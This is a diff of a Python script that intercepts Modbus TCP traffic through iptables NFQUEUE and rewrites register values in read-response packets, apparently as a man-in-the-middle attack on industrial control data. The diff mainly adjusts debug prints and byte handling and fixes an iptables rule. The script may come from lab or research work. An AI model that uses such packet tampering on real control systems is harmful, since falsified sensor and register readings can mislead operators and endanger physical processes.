@@ -36,19 +36,20 @@ def packet_listener(packet):
     if pl.haslayer("Read Holding Registers Response"): 
       write_status=1        
       
-      print('Original payload is ',bytes(pl['Read Holding Registers Response'].registerVal))
-      pload2=list(bytes(pl['Read Holding Registers Response'].registerVal))
+     #  print('Original payload is ',bytes(pl['Read Holding Registers Response'].registerVal))
+      print('Original payload is ',pl['Read Holding Registers Response'].registerVal)
+      #pload2=list(bytes(pl['Read Holding Registers Response'].registerVal))
+      pload2=pl['Read Holding Registers Response'].registerVal
       
       pload2[0]=7
       print('payload2 is ',pload2)
       #pl['Write Single Register'].remove_payload
       pl['Read Holding Registers Response'].registerVal=pload2
-      print('the new payload is ',bytes(pl['Read Holding Registers Response'].registerVal))
+      print('the new payload is ',pl['Read Holding Registers Response'].registerVal)
       del pl[TCP].chksum
       del pl[IP].chksum
-      packet.set_payload(bytes(pl))
+      packet.set_payload(pl)
       packet.drop()
-      
       pl.show() 
     '''
     elif pl.haslayer("Write Single Register Response"):
@@ -82,7 +83,7 @@ def packet_listener(packet):
   
   
 def __setdown():
-  os.system("sudo iptables -t mangle -D PREROUTING -i wlp0s20f3-p TCP -j NFQUEUE --queue-num 1") 
+  os.system("sudo iptables -t mangle -D PREROUTING -i wlp0s20f3 -p TCP -j NFQUEUE --queue-num 1") 
     
 
 os.system("sudo iptables -t mangle -A PREROUTING -i wlp0s20f3 -p TCP -j NFQUEUE --queue-num 1")
